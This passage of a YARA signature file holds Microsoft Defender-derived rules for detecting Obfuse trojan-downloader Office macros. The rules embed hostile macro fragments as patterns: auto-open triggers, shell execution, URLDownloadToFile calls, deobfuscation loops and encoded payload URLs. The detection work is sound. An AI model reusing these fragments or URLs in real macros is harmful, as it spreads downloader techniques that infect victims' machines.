            ((5 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_KAAY_2147822957_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KAAY!MTB"
        threat_id = "2147822957"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-79] 3d 63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 72 65 63 65 6e 74 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {72 61 6e 67 65 28 22 74 31 22 29 2e 76 61 6c 75 65 3d 22 [0-47] 22 72 61 6e 67 65 28 22 72 31 22 29 2e 76 61 6c 75 65 3d 22 [0-47] 22 6d 73 67 62 6f 78 22 74 72 72 79 69 6e 66 67 76 76 74 6f 6f 70 74 6a 62 66 64 6f 63 75 6d 65 62 6a 6b 62 67 22}  //weight: 1, accuracy: Low
        $x_1_3 = ".open\"get\"," ascii //weight: 1
        $x_1_4 = "23acefinoprstuxybcdeilopsuy\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MAB_2147826396_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MAB!MTB"
        threat_id = "2147826396"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "str = str & \"0f121f123f90f54f53\"" ascii //weight: 1
        $x_1_2 = {53 68 65 6c 6c 20 66 6c 64 72 5f 6e 61 6d 65 [0-40] 20 26 20 66 69 6c 65 5f 6e 61 6d 65 [0-40] 20 26 20 22 2e 65 22 20 26 20 22 78 65 22 2c 20 76 62 4e 6f 72 6d 61 6c 4e 6f 46 6f 63 75 73}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 55 73 65 72 46 6f 72 6d 31 2e 54 65 78 74 42 6f 78 [0-2] 2e 54 65 78 74 2c 20 22 66 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 66 76 [0-40] 20 26 20 22 78 65 22 2c 20 76 62 4e 6f 72 6d 61 6c 4e 6f 46 6f 63 75 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BBC_2147826587_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BBC!MTB"
        threat_id = "2147826587"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "co = Shell(sFilePath + sFileName, vbNormalFocus)" ascii //weight: 1
        $x_1_2 = "h = DownloadFileAPI(sFileURL, sFilePath & sFileName)" ascii //weight: 1
        $x_1_3 = "h = (URLDownloadToFile(0, sFileURL, ToPathName, 0, 0) = 0)" ascii //weight: 1
        $x_1_4 = "vbCritical, \"www.excel-vba.ru" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBD_2147827257_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBD!MTB"
        threat_id = "2147827257"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "specialpath+(\"\\hv.\").open\"get\",(\"h://www.d.m/gjkkhhhg/kjdh.\")" ascii //weight: 1
        $x_1_2 = "specialpath+(\"\\m.\").open\"get\",(\"h://ghq.ghb./bh/\")" ascii //weight: 1
        $x_2_3 = "chr(50)+chr(48)+chr(48)setwshshell=createobject(\"wscript.shell\")" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PDP_2147827674_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDP!MTB"
        threat_id = "2147827674"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-3] 77 73 68 73 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29 64 69 6d 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 5c [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 68 6b 6c 6c 2e 6d 2f 6a 76 76 71 77 76 62 67 6d 2f 6b 6a 64 68 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 5c [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 68 6b 6c 6c 2e 6d 2f 6a 6b 6a 7a 64 67 64 6c 7a 6a 6b 62 6b 62 6b 7a 6a 62 6b 6a 68 62 67 2f 67 68 67 67 68 68 68 67 62 76 76 6d 68 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDQ_2147828218_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDQ!MTB"
        threat_id = "2147828218"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-3] 77 73 68 73 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29 64 69 6d 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 64 2e 6d 2f 6d 2f 67 68 68 6d 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 64 2e 6d 2f 62 6d 2f 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDQ_2147828218_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDQ!MTB"
        threat_id = "2147828218"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-3] 77 73 68 73 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29 64 69 6d 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 6a 2d 68 6c 67 2e 6d 2f 2f 76 64 68 68 62 67 2f 67 68 67 67 68 68 68 67 62 76 76 6d 68 2e}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 6a 2d 68 6c 67 2e 6d 2f 67 2f 64 6a 67 6a 68 64 6a 6a 64 67 6a 68 62 67 68 64 6a 6b 64 68 67 68 6a 64 2f 64 6a 68 64 67 6a 67 6a 76 31 2e}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 2e 6d 2e 2f 62 6d 76 71 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBE_2147829744_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBE!MTB"
        threat_id = "2147829744"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(Cells(106, 2))" ascii //weight: 1
        $x_1_2 = "= t8g0f.Open(v0df + \"\\Urhjg.bat\")" ascii //weight: 1
        $x_1_3 = "\"C:\\Users\\\" + qaXGi().Namespace(USER_PROFILE)" ascii //weight: 1
        $x_1_4 = "rev & Mid(s, p, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBF_2147830074_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBF!MTB"
        threat_id = "2147830074"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "$ht~tp^://^up~pg$re$de`.^sc@ie^nce`ont~he^we^b@.n~et^/f`il~e/^upl$o$ad^/l$i~st.~php" ascii //weight: 1
        $x_1_2 = "=replace(s,k,\"\")" ascii //weight: 1
        $x_1_3 = "getobject(unpck(1))" ascii //weight: 1
        $x_1_4 = "autoopen()onerrorresumenext" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBG_2147830253_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBG!MTB"
        threat_id = "2147830253"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "plqMxj.Open (fNadv + \"\\GZNGX.js\")" ascii //weight: 1
        $x_1_2 = "ActiveSheet.OLEObjects(1).Copy" ascii //weight: 1
        $x_1_3 = "plqMxj = CreateObject(mermkd())" ascii //weight: 1
        $x_1_4 = {57 6f 72 6b 62 6f 6f 6b 5f 41 63 74 69 76 61 74 65 28 29 0d 0a 43 61 6c 6c 20 74 65 62 4b}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KDKD_2147830255_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KDKD!MTB"
        threat_id = "2147830255"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "aysfhm.open(rdhtj+\"\\sfowq.js\")" ascii //weight: 1
        $x_1_2 = "activesheet.oleobjects(1).copy" ascii //weight: 1
        $x_1_3 = "aysfhm=createobject(mermkd())" ascii //weight: 1
        $x_1_4 = "workbook_activate()callfspaendsubsubsrhzflxfc(rdhtj)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBH_2147830463_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBH!MTB"
        threat_id = "2147830463"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "getobject(soc3van4se(\"132118123122116122129128071\"))" ascii //weight: 1
        $x_1_2 = ".get(soc3van4se(\"100118123064063108093127124112114128128\")).create" ascii //weight: 1
        $x_1_3 = "=chr(oxz1krk1lc-13)endfunction" ascii //weight: 1
        $x_1_4 = {61 75 74 6f 6f 70 65 6e 28 29 [0-15] 65 6e 64 73 75 62 73 75 62 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBI_2147830537_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBI!MTB"
        threat_id = "2147830537"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 22 22 65 78 65 2e ?? ?? ?? ?? ?? ?? 2f ?? ?? ?? ?? 2f 6d 6f 63 2e 6d 69 78 65 70 6c 75 74 2f 2f 3a 70 74 74 68 22 22 22}  //weight: 1, accuracy: Low
        $x_1_2 = {22 22 22 65 78 65 2e ?? ?? ?? ?? ?? ?? 2f ?? ?? ?? ?? 2f 6d 6f 63 2e 65 6e 79 64 6c 65 6c 65 74 2f 2f 3a 73 70 74 74 68 22 22 22}  //weight: 1, accuracy: Low
        $x_3_3 = {4d 69 64 28 [0-10] 39 2c 20 [0-10] 30 2c 20 31 29}  //weight: 3, accuracy: Low
        $x_3_4 = "cmd1(XxX, aAa) + URL(XxX, aAa) + cmd2(XxX, aAa)" ascii //weight: 3
        $x_3_5 = "Auto_Open()" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_RVBI_2147830537_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBI!MTB"
        threat_id = "2147830537"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t8g0f.Open(v0df + \"\\vXxTY.bat\")" ascii //weight: 1
        $x_1_2 = "C:\\Users\\\" + ZXDdz().Namespace(USER_PROFILE)" ascii //weight: 1
        $x_1_3 = "Open FknmTw For Output As #1" ascii //weight: 1
        $x_1_4 = "GetObject(Cells(106, 2))" ascii //weight: 1
        $x_1_5 = {57 6f 72 6b 62 6f 6f 6b 5f 41 63 74 69 76 61 74 65 28 29 0d 0a 43 65 6c 6c 73 28 32 2c 20 31 29 2e 56 61 6c 75 65 20 3d 20 31}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDOC_2147831944_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDOC!MTB"
        threat_id = "2147831944"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "path_file=environ$(\"appdata\")call" ascii //weight: 1
        $x_1_2 = "longfori=1tolen(hextostr)step2strtemp=chr$(val(\"&h\"&mid$(hextostr,i,2)))strreturn=strreturn&strtempnextihextostring" ascii //weight: 1
        $x_1_3 = ".getfolder(\"\\\")dimtaskdefinitionsettaskdefinition=service.newtask(0)dim" ascii //weight: 1
        $x_1_4 = "hi(\"c:\\users\\public\\downloads\\sdns.zip\",path_file+" ascii //weight: 1
        $x_1_5 = "433a5c55736572735c5075626c69635c446f776e6c6f6164735c73646e732e646c6c" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDU_2147832173_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDU!MTB"
        threat_id = "2147832173"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)dimwshshellasobject" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"nethood\")dimh" ascii //weight: 1
        $x_1_3 = "=specialpath+bfnfhtyooun(\"iex_o]wc]x;nn\")vbnd.open\"get\",bfnfhtyooun" ascii //weight: 1
        $x_1_4 = "=1tolen(fikmgb)kmiol=kmiol&chr(asc(mid(fikmgb,hdnry,1))-13)next" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBJ_2147833293_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBJ!MTB"
        threat_id = "2147833293"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "abmagqacwbmahmazabmacaapqagaciazgbzagyazabnaggazgbkagqazgbnaggaiga7aa==" ascii //weight: 1
        $x_1_2 = "shell(nrapoinf,4/8*sin(0))'0000endsub" ascii //weight: 1
        $x_1_3 = "document_open()callsaqevvhyiendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBK_2147833305_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBK!MTB"
        threat_id = "2147833305"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 72 65 61 74 65 6f 62 6a 65 63 74 28 [0-15] 28 63 68 72 28 [0-11] 29 26 63 68 72 28 [0-11] 29 26 00 03 29 26 63 68 72 28 [0-11] 29 26 63 68 72 28 [0-11] 29 29 29 73 65 74 [0-15] 3d [0-15] 2e 65 78 65 63 28 00 28 22 75 6b 33 72 78 36 6b 31 77 76 62 77 6a 68 6a 72 30 64 6a 67 65 6d 71 76 30 68 32 6b 70 6e 74 75 34 6a 61 30 76 61 68}  //weight: 1, accuracy: Low
        $x_1_2 = {63 68 72 28 [0-15] 28 28 72 61 77 61 6e 64 32 35 35 29 2c 30 29 29 [0-15] 3d [0-15] 2b 64 2b 63 2b 62 2b 61 6e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SLL_2147835992_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SLL!MTB"
        threat_id = "2147835992"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "2E446F776E6C6F616446696C65282768747470733A2F2F7777772E766F6965766F64756C67656C752E726F2F6F776E636C6F75642F696E6465782E7068702F732F7358387361726E374730436D75737A2F646F776E6C6F6164272C" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_APD_2147836028_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.APD!MTB"
        threat_id = "2147836028"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-3] 77 73 68 73 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29 64 69 6d 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 6a 2d 68 6c 67 2e 6d 2f 62 2f 6d 62 6c 68 64 6c 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBL_2147836136_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBL!MTB"
        threat_id = "2147836136"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 68 72 28 41 73 63 28 4d 69 64 28 [0-200] 2c 20 [0-200] 2c 20 31 29 29 20 2d 20 31 33 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 4b 4e 6b 6a 62 47 42 48 4a 56 76 68 28 22 [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 65 63 69 61 6c 50 61 74 68 20 2b 20 4b 4e 6b 6a 62 47 42 48 4a 56 76 68 28 22 [0-36] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBM_2147836207_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBM!MTB"
        threat_id = "2147836207"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 68 72 28 41 73 63 28 4d 69 64 28 [0-200] 2c 20 [0-200] 2c 20 31 29 29 20 2d 20 31 33 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 6b 6e 6a 62 6b 37 67 62 35 62 6a 66 67 28 22 [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 65 63 69 61 6c 50 61 74 68 20 2b 20 6b 6e 6a 62 6b 37 67 62 35 62 6a 66 67 28 22 [0-36] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BPD_2147836347_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BPD!MTB"
        threat_id = "2147836347"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-3] 77 73 68 73 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = "=specialpath+yuiygvjhvhtfhj(\"iy\\_puep;nn\")umefpdfmrc" ascii //weight: 1
        $x_1_4 = "=specialpath+knjbjggjkjfvk(\"i^_qo\\zzz\\;nn\")hhhjcfjreemhi" ascii //weight: 1
        $x_1_5 = {26 63 68 72 28 61 73 63 28 6d 69 64 28 [0-210] 2c [0-210] 2c 31 29 29 2d 31 33 29 6e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBO_2147836734_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBO!MTB"
